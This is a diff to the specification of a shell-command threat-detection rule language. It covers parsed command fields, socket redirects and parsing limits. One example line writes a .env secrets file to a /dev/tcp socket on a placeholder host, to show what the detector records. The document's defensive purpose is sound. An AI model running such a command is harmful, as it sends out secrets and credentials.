@@ -229,7 +229,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   `{ a; b; } | c` or `(a) | c` carries that stage unless it is a stage of an inner pipeline
   or inside a substitution) and `nested` (inside a command or process
   substitution, or inside a command line another command hands on). When `sh`, `bash`,
-  `zsh`, `dash` or `ksh` appears
+  `zsh`, `dash` or `ksh` appears (since v1.3 by any path, as `name` is read: `~/bin/bash`)
   as a word of a command with an option cluster containing `c`, its first operand, if known,
   is read the same way, and its commands follow the shell's with
   `nested` true and pipeline numbers of their own. Since v1.3 the same holds for the
@@ -273,8 +273,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   quote, here-document, substitution or compound command) yields the commands before the
   point where it became incomplete; one that does not parse yields the empty list, so a
   rule that must not miss such captures keeps a `command.command` fallback for it. The
-  reference derivation is `threatrules.ParsedCommands` over `shellcmd.Parse`, and the file
-  effects are `shellcmd.FileEffects`.
+  reference derivation is `threatrules.ParsedCommands` over `shellcmd.Read`, and the file
+  effects are `shellcmd.Command.FileEffects`.
 
   The two v1.3 changes to `name` and to which commands are listed apply to every rule an
   engine at v1.3 or later evaluates, whatever `spec` the rule declares: an engine derives the
@@ -301,11 +301,13 @@ the steps in both orders still fires once. A single event never satisfies two st
   therefore reads a line only within these bounds, and a line past one has no
   `parsed_commands` and is incomplete, which leaves it to a rule's reading of its text: the
   brace expansions of the line produce at most 1,024 words, and those of its scripts
-  together as many again; the commands of the line and of the scripts it runs number at
-  most 256 and come to at most 4,096 words. A line cut inside more than 32 open constructs
-  is incomplete with no commands as well. A script is read, and its commands listed, while
-  the scripts of the line come to at most 16 KiB; a script past that is left unread like
-  the code of an interpreter, so the command that runs it has `runs_read` false.
+  together as many again; the text of the command lines the line hands on (its scripts,
+  carried command lines, what a pipe sends a shell, what an inline script runs) comes to at
+  most 16 KiB together; and the commands of the line and of what it hands on number at most
+  256 and come to at most 4,096 words. A line cut inside more than 32 open constructs is
+  incomplete with no commands as well. A command line handed on more than three levels deep
+  is not a bound: it is not read, the command that hands it on has `runs_read` false, and
+  the line is complete.
 - `file_writes` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
   later) is a field of each `parsed_commands` entry: the files the command evidently writes,
   a list of `{path, op}` with the `op` values of `file_effects` (`write`, `append`, `touch`,
@@ -460,8 +462,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   here-document that is not a script is not read as commands, and what a script of another
   language does with a file through a variable is not followed. A shell that reads its
   script from a here-document takes in what the body expands, and its script's commands do
-  not read that as their standard input. The reference derivation is `shellcmd.FileReads`
-  over `shellcmd.WithScripts`.
+  not read that as their standard input. The reference derivation is `shellcmd.Read`
+  (`Line.Reads`).
 - `socket_redirects` (since v1.3; a rule that selects it MUST declare
   `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` lists the
   command's redirections to or from bash's network pseudo-files, each `{path, op}`. `path` is
@@ -475,7 +477,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   `exec 3<>/dev/tcp/h/1; cat .env >&3` the `exec` entry has `{/dev/tcp/h/1, readwrite}` and
   the `cat` entry `{/dev/tcp/h/1, write}`. A later `exec` that closes the descriptor or
   points it elsewhere ends that. The same path as a word of a command is not a redirection.
-  The reference derivation is `shellcmd.SocketRedirects`.
+  The reference derivation is `shellcmd.Read` (`Line.Sockets`).
 - `runs_read` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
   later) on an entry of `e.command.parsed_commands` is true when the command hands a command
   line to another program to run (a shell's `-c` script, the here-document it reads or the
@@ -490,7 +492,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   tell a program whose commands answer for themselves from one it cannot see into.
   For `xargs` and `find` it says only that the command they run is listed: that command's
   operands come from a pipe or from what `find` matches, which the entry does not hold.
-  The reference derivation is `shellcmd.Command.RunsRead` over `shellcmd.WithScripts`.
+  The reference derivation is `shellcmd.Command.RunsRead` over `shellcmd.Read`.
 - `span` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
   later) on an entry of `e.command.parsed_commands` is the part of the command line that can
   decide what the command runs, as text. It exists for the rule that must match text because
@@ -515,7 +517,7 @@ the steps in both orders still fires once. A single event never satisfies two st
   `$`, `#`, `!`) and no statement at or before the command that uses it assigns it. An entry
   that comes from a command line another command hands on has the `span` of the entry of the
   line itself that it came from. The span over-approximates on purpose and always holds the
-  command's own text. The reference derivation is `shellcmd.Spans`.
+  command's own text. The reference derivation is `shellcmd.Read` (`Line.Spans`).
 - `earlier_stages` and `later_stages` (since v1.3; a rule that selects either MUST declare
   `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` are lists of
   integers: the 0-based indexes, in `e.command.parsed_commands` and in ascending order, of the
